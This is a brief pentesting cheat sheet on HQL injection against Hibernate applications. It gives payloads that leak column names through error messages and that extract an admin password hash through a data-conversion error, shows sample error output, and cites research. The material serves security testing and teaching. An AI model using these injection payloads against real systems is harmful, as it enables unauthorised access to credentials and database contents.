# Hibernate Query Language Injection 

> Hibernate ORM (Hibernate in short) is an object-relational mapping tool for the Java programming language. It provides a framework for mapping an object-oriented domain model to a relational database. - Wikipedia

## HQL Comments

```sql
HQL does not support comments
```

## HQL List Columns

```sql
from BlogPosts
where title like '%'
  and DOESNT_EXIST=1 and ''='%' -- 
  and published = true
```

Using an unexisting column will an exception leaking several columns names.

```sql
org.hibernate.exception.SQLGrammarException: Column "DOESNT_EXIST" not found; SQL statement:
      select blogposts0_.id as id21_, blogposts0_.author as author21_, blogposts0_.promoCode as promo3_21_, blogposts0_.title as title21_, blogposts0_.published as published21_ from BlogPosts blogposts0_ where blogposts0_.title like '%' or DOESNT_EXIST='%' and blogposts0_.published=1 [42122-159]
```

## HQL Error Based

```sql
from BlogPosts
where title like '%11'
  and (select password from User where username='admin')=1
  or ''='%'
  and published = true
```

Error based on value casting.

```sql
Data conversion error converting "d41d8cd98f00b204e9800998ecf8427e"; SQL statement:
select blogposts0_.id as id18_, blogposts0_.author as author18_, blogposts0_.promotionCode as promotio3_18_, blogposts0_.title as title18_, blogposts0_.visible as visible18_ from BlogPosts blogposts0_ where blogposts0_.title like '%11' and (select user1_.password from User user1_ where user1_.username = 'admin')=1 or ''='%' and blogposts0_.published=1
```

:warning: **HQL does not support UNION queries**

## References

* [HQL for pentesters - February 12, 2014 - Philippe Arteau](https://blog.h3xstream.com/2014/02/hql-for-pentesters.html)
* [How to put a comment into HQL (Hibernate Query Language)? - Thomas Bratt](https://stackoverflow.com/questions/3196975/how-to-put-a-comment-into-hql-hibernate-query-language)
* [HQL : Hyperinsane Query Language - 04/06/2015 - Renaud Dubourguais](https://www.synacktiv.com/ressources/hql2sql_sstic_2015_en.pdf)
* [ORM2Pwn: Exploiting injections in Hibernate ORM - Nov 26, 2015 - Mikhail Egorov](https://www.slideshare.net/0ang3el/orm2pwn-exploiting-injections-in-hibernate-orm)